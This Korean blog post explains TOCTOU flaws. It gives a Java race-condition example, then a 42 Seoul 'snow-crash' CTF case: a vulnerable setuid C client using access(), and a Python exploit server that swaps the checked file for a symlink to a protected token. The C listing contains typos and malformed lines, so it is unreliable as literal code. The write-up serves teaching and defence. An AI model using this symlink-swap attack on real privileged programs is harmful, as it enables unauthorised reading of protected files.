```toc
```
# TOCTOU란?

[TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)는 `time-of-check to time-of-use`의 약자로 **검사 시점과 사용 시점의 사이**에 발생할 수 있는 취약점을 일컫는다.  이 설명만 들어서는 무슨 취약점이 있다는건지 바로 와닿지 않을 것이다. TOCTOU가 유발 할 수 있는 문제들을 통해 좀 더 자세히 살펴보자.

# Race Condition 유발

예를 들어 다음과 같이 파일의 존재 여부를 체크하고 파일을 삭제하는 코드가 있다고 생각해보자.

```java
if (file.exist()) {
	file.delete();
}
```

해당 코드의 문제는 `Race Condition`을 유발할 수 있다. 만약에 multi-thread 환경의 프로그램이라고 가정을 해보자. 쓰레드 A와 쓰레드 B가 동시에 해당 로직에 접근을 하였을때 **A가 파일 체크에 성공하고 파일을 삭제하기 전, 아직 파일이 삭제 되기 전이기에 B도 파일 체크에 성공**을 할 수 있다. 그렇게 되면 **B가 파일을 삭제하려는 시점에는 이미 A가 파일이 삭제된 후이고, B는 에러를 발생** 시킬 것이다.

이러한 문제를 TOCTOU라 일컬으며 해당 문제는 파일 존재를 체크하는 것만으로는 부족하고 `Thread-safe`하게 코드를 짜야한다.

```java
private synchronized void fileDelete(File file) {
    if (file.exists()) {
        file.delete();
    }
}
```

공유 자원을 처리하는 부분을 동기화 메소드로 만들어 race condition을 방지 할 수 있다. 위와 같이 코드를 작성한다면 **오직 하나의 쓰레드만이 파일의 존재를 체크하고 삭제할 것이며, 다른 쓰레드가 해당 작업을 배정 받았더라도 이미 삭제가 된 후에 `if (file.exists())`에 접근** 할 수 있기에 race condition이 일어나지 않을 것이다. 다만 이와 같이 동기화를 사용할 때는 **필요 이상의 부분을 동기화 하여 성능을 저하시키지 않도록 주의**해야 한다. 

# 보안상의 취약점

TOCTOU는 race condition 뿐만 아니라 보안상으로도 심각한 문제를 일으킬 수 있다. 다음 코드를 보자.

```C
if (access(file_path, R_OK | W_OK)) {
	# === start ===
	pritnf("Connecting to %s:6969 .. ", host);
	fflush(stdout);
	# connection logic
	# ...
	write(socket_fd, ".*( )*.\n", 8);
	printf("Connected!\nSending file .. "Connected!);
	fflush(stdout);
	# === end ===
	open(file_path, O_RDONLY, S_IXUSR);
	read(file_fd, buffer, 4096);
	write(socket_fd, buffer, 5);
	puts("wrote file!");
} else {
	printf("You don`t have access to %s\n", file_name);
}
```

인자로 파일의 경로와 서버의 호스트를 받아 그 파일을 읽고 서버에게 파일의 내용을 전달하는 클라이언트 프로그램이다. **해당 코드의 문제점은 `if (access(file_path, R_OK | W_OK))`로 파일의 권한을 체크하는 시점과  `open(file_path, O_RDONLY, S_IXUSR);`을 하는 시점 사이에 갭이 너무 크다는 점**이다.

주석으로 `=== start ===`와 `=== end ===`로 그 갭을 표시해두었다. 파일의 권한을 체크하고 실제로 사용을 하기 까지 서버와 연결을 맺는 코드도 존재하고, 서버의 socket에 write를 하는 코드도 존재한다. 네트워크를 통한 connection과 I/O는 모두 시간이 제법 걸리는 작업들이고 그 시간을 공격자에게 충분히 **파일을 바꿔치기 할 수 있는 시간**을 준다. 다음 코드를 보자.

```python
import sys, os, socket, time

if __name__ == "__main__":
    argv = sys.argv
    file_name=argv[1]
    host='127.0.0.1'
    port=6969
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)

    print "Server started on {}:{}:{}".format(host, port, file_name)

    while True:
        client_socket, client_address = server_socket.accept()
        print "Client connected from {}".format(client_address)

		# 바꿔치기
        os.remove(file_name)
        os.symlink("token", file_name)
        
        try:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                print "{}".format(data)
        finally:
            print "Connection with client {} closed.".format(client_address)
            client_socket.close()
```

파이썬으로 작성한 매우 간단한 서버 프로그램이다. 주목해야할 부분은 `# 바꿔치기`라고 주석을 달아놓은 부분인데 파일을 삭제하고 그 파일과 똑같은 이름으로 token의 심볼릭 링크를 만든다. 이렇게 되면 **위 클라이언트를 실행한 유저에게는 token 파일에 대한 read 권한이 없더라도 `access()`를 통과한 시점에 read 권한이 있는 token에 대한 심볼릭 링크로 바꿔치기 하여 token의 내용을 알 수 있다.**

해당 케이스는 `42 Seoul`의  CTF 문제 풀이 과제인 `snow-crash`의 문제 중 하나였다. 매 문제마다 token을 탈취해 다음 레벨로 넘어가기 위한 key인 flag를 획득해야 하는 과제이다. 위 클라이언트 프로그램은 token의 소유주와 동일한 소유주의 파일이었고 [`SetUID`](https://velog.io/@sinryuji/SetUID%EB%9E%80)가 설정되어 있었기에 TOCTOU를 통해 `access()`를 우회하여 token의 내용을 탈취할 수 있었다. 해당 문제의 경우엔 read 권한이 없던 token 파일의 내용을 탈취했지만 이게 token이 아니라 **보안상 중요한 내용을 가진 파일이고 위와 같이 TOCTOU의 취약점을 가진 프로그램이 있다면 충분히 해당 내용이 탈취될 수 있는 가능성이** 있다.

```
SECURITY CONSIDERATIONS

The result of access() should not be used to make an actual access control decision, since its response, even if correct at the moment it is formed, may be outdated at the time you act on it.  access() results should only be used to pre-flight, such as when configuring user interface elements or for optimization purposes.  The actual access control decision should be made by attempting to execute the relevant system call while holding the applicable credentials, and properly handling any resulting errors; and this must be done even though access() may have predicted success. Additionally, set-user-ID and set-group-ID applications should restore the effective user or group ID, and perform actions directly rather than use access() to simulate access checks for the real user or group ID.
```

`man`에서도 위와 같이 `access()`의 보안 고려 사항을 안내하고 있다. `access()`의 TOCTOU 취약점은 그만큼 오래되었고 널리 알려진 취약점인 만큼 `access()`를 사용할 땐 각별한 주의가 필요하다.